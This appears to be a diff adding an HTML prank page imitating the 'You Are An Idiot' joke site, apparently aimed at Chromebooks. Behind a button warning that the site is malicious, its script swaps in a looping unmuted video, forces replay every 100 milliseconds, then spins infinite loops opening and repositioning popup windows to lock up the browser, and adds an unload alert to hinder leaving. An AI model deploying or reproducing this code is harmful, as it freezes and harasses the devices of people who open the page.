@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+
+<script>
+	function loop() {
+		document.getElementById("vid").play();
+		document.getElementById("vid").muted = false;
+		document.getElementById("vid").playbackRate = 1;
+		document.getElementById("vid").controls = false;
+		document.getElementById("vid").loop = true;
+		setTimeout(loop, 100);
+	}
+
+	function run() {
+		document.getElementById("title").innerText = "You Are An Idiot";
+		document.getElementById("body").innerHTML = '<video id="vid" style="top:0px;position:absolute;width:100vw;height:100vh;" autoplay loop><source src="https://ia801806.us.archive.org/10/items/you-are-an-idiot-video/youare.mp4" type="video/mp4"></video>';
+		loop();
+		setTimeout(() => {while(1){var wind=window.open("about:blank",'-',"width=200","height=200");while(1){wind.moveTo(0,0);wind.resizeTo(200,200);}}}, 1000);
+	}
+</script>
+
+<html style="overflow:hidden">
+	<head>
+		<title id="title">Are You An Idiot?</title>
+	</head>
+	<body id="body" onunload='alert("trying to leave me now?");'>
+		<button onclick="run()">This site is malicious, continue?</button>
+		<p style="position:absolute;bottom:3px">This was designed specifically for some Chromebooks so don't be surprised if it doesn't do anything major.</p>
+	</body>
+</html>
+
+<script>
+	var TestPopup = window.open('about:blank', '-', "width=200", "height=200");
+	if (!TestPopup) {
+		document.getElementById("body").innerHTML = "<p>Please enable popups and refresh the tab</p>";
+	} else {
+		TestPopup.close();
+	}
+</script>
